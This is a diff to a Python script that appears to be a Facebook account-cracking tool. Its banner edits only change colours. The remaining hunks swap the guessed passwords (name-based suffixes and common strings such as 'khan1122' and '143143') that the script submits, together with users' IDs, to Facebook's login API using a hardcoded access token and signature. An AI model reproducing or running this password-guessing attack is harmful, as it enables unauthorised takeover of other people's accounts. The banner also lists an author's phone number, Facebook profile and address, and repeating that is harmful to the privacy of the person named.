@@ -71,17 +71,17 @@ c3 = "\033[1;91m"
 logo = """                                 
 \033[1;92m       $$$$$$\          $$$$$$\  
 \033[1;92m      $$  __$$\        $$  __$$\ 
-\033[1;93m      $$ /  \__|       $$ /  $$ |
-\033[1;93m      \$$$$$$\ $$$$$$\ $$$$$$$$ |
+\033[1;96m      $$ /  \__|       $$ /  $$ |
+\033[1;96m      \$$$$$$\ $$$$$$\ $$$$$$$$ |
 \033[1;95m       \____$$\\______|$$  __$$ |
 \033[1;95m      $$\   $$ |       $$ |  $$ |
-\033[1;96m      \$$$$$$  |       $$ |  $$ |
-\033[1;96m       \______/        \__|  \__|                                                                                                                                                                                                                            
-\033[1;95m-----------------------------------------------
-\033[1;92m AUTHOR IS : SuFyan AhMad
-\033[1;92m WHATSAPP  : 03489458276
-\033[1;92m FACEBOOK  : https://www.facebook.com/Sufyan.shabqadry
-\033[1;92m Address   : Peshawar Shabqaddar Khwajawas 
+\033[1;93m      \$$$$$$  |       $$ |  $$ |
+\033[1;93m       \______/        \__|  \__|                                                                                                                                                                                                                            
+\033[1;92m-----------------------------------------------
+\033[1;93m AUTHOR IS : SuFyan AhMad
+\033[1;94m WHATSAPP  : 03489458276
+\033[1;95m FACEBOOK  : https://www.facebook.com/Sufyan.shabqadry
+\033[1;96m Address   : Peshawar Shabqaddar Khwajawas 
 \033[1;92m----------------------------------------------- 
 """  
 def main():
@@ -486,7 +486,7 @@ def menu_select():
  
 		try:
  
-		    pass1=name+"@123"
+		    pass1=name+"111"
  
 		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
  
@@ -519,7 +519,7 @@ def menu_select():
  
 		        else:
  
-		            pass2=name+"@#@#"
+		            pass2=name+"11"
  
 		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
  
@@ -553,7 +553,7 @@ def menu_select():
  
 		                else:
  
-		                    pass3=name+"/123"
+		                    pass3=name+"321"
  
 		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
  
@@ -587,7 +587,7 @@ def menu_select():
  
 		                        else:
  
-		                            pass4=name+"@@"
+		                            pass4=name+"1122"
  
 		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
  
@@ -621,7 +621,7 @@ def menu_select():
  
 		                                else:
  
-		                                    pass5="love143"
+		                                    pass5="khan1122"
  
 		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
  
@@ -655,7 +655,7 @@ def menu_select():
  
 		                                        else:
  
-		                                            pass6="334455"
+		                                            pass6="khan123"
  
 		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
  
@@ -689,7 +689,7 @@ def menu_select():
  
 		                                                else:
  
-		                                                    pass7="000786"
+		                                                    pass7="143143"
  
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
  
